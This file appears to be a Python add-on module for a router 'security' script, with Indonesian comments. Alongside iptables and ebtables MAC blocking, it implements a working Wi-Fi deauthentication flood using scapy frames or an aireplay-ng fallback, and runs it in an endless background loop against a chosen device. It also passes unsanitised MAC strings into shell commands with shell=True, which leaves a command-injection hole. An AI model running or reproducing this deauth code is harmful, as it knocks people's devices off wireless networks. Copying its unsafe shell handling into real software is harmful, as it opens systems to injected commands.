#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Modul tambahan: Deauth & Hard Block
# Digunakan oleh router_ultimate_secure.py

import subprocess
import time
import threading
import os

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, getmacbyip
except ImportError:
    print("Instal scapy: pip3 install scapy")
    # fallback dummy
    def sendp(*args, **kwargs): pass

# =========================================
#  FUNGSI BLOKIR MAC (SAMA DENGAN MAIN)
# =========================================
def block_mac(mac):
    try:
        subprocess.run(f"ebtables -A FORWARD -s {mac} -j DROP", shell=True, check=True)
        subprocess.run(f"ebtables -A INPUT -s {mac} -j DROP", shell=True, check=True)
        subprocess.run(f"iptables -A FORWARD -m mac --mac-source {mac} -j DROP", shell=True, check=True)
        subprocess.run(f"iptables -A INPUT -m mac --mac-source {mac} -j DROP", shell=True, check=True)
        return True
    except:
        return False

# =========================================
#  DEAUTH PACKET SPAM
# =========================================
def send_deauth(target_mac, ap_mac, interface, count=50, interval=0.1):
    """
    Kirim deauth packet ke target MAC dari AP MAC.
    Otomatis mencoba monitor mode.
    """
    # Coba deteksi monitor interface
    mon_iface = interface
    # Cek apakah interface dalam monitor mode
    try:
        out = subprocess.run(f"iwconfig {interface} 2>/dev/null | grep -i monitor", shell=True, capture_output=True, text=True)
        if not out.stdout.strip():
            # Coba buat monitor interface dengan airmon-ng
            try:
                subprocess.run(f"airmon-ng start {interface}", shell=True, check=True, capture_output=True)
                mon_iface = interface + "mon"
                time.sleep(1)
            except:
                # Fallback: jalankan aireplay-ng langsung
                cmd = f"aireplay-ng -0 {count} -a {ap_mac} -c {target_mac} {interface} >/dev/null 2>&1 &"
                subprocess.Popen(cmd, shell=True)
                return True
    except:
        pass

    # Gunakan scapy untuk mengirim deauth
    try:
        frame = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
        sendp(frame, iface=mon_iface, count=count, inter=interval, verbose=0)
        return True
    except Exception as e:
        print(f"[!] Deauth error: {e}")
        return False

# =========================================
#  HARD BLOCK — BLOKIR + DEAUTH BACKGROUND
# =========================================
def hard_block(target_mac, ap_mac, interface, count=100):
    """
    Kombinasi: block MAC via iptables/ebtables + spam deauth di background.
    """
    # Blokir dulu
    block_mac(target_mac)

    # Jalankan deauth loop di background
    def _deauth_loop():
        while True:
            send_deauth(target_mac, ap_mac, interface, count=10, interval=0.05)
            time.sleep(5)
    t = threading.Thread(target=_deauth_loop, daemon=True)
    t.start()
    return True

# =========================================
#  UNBLOCK (UNTUK KELENGKAPAN)
# =========================================
def unblock_mac(mac):
    try:
        subprocess.run(f"ebtables -D FORWARD -s {mac} -j DROP", shell=True)
        subprocess.run(f"ebtables -D INPUT -s {mac} -j DROP", shell=True)
        subprocess.run(f"iptables -D FORWARD -m mac --mac-source {mac} -j DROP", shell=True)
        subprocess.run(f"iptables -D INPUT -m mac --mac-source {mac} -j DROP", shell=True)
        return True
    except:
        return False
